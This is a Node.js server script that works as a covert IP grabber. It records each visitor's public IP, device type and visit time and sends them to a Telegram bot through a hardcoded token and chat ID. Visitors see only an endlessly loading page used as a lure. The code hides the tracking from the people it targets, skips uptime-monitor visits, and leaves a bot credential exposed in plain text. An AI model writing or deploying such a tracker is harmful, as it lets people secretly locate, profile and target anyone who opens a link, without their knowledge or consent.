const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    
    // Ignore automated visits from UptimeRobot
    if (userAgent.toLowerCase().includes('uptimerobot')) {
        res.writeHead(200, { 'Content-Type': 'text/plain' }); 
        res.end("OK"); 
        return;
    }

    if (req.method === 'GET') {
        const time = new Date().toLocaleTimeString();

        // Extract the true public IP address passing through Render's load balancers
        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        // Clean up the IP string in case it lists multiple proxy hops
        const cleanIp = rawIp.split(',')[0].trim();

        // Detect device information natively via the User-Agent header
        let deviceType = "Unknown Device";
        if (/iPhone|iPad|iPod/i.test(userAgent)) {
            deviceType = "iOS Device";
        } else if (/Android/i.test(userAgent)) {
            deviceType = "Android Device";
        } else if (/Windows/i.test(userAgent)) {
            deviceType = "Windows PC";
        } else if (/Macintosh/i.test(userAgent)) {
            deviceType = "Mac Computer";
        }

        // Send a clean text notification straight to your Telegram Bot immediately
        const msg = `🌐 *New Connection Detected!*\n👤 *Device Type:* ${deviceType}\n⏰ *Time:* ${time}\n📶 *Public IP Address:* \`${cleanIp}\``;
        sendTelegramMessage(msg);

        // Serve the simple, endless loading webpage back to the user
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            if (err) {
                res.writeHead(500); res.end("Missing template file");
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        });
    } else {
        res.writeHead(404);
        res.end();
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`IP Tracking Server active on port ${PORT}`);
});
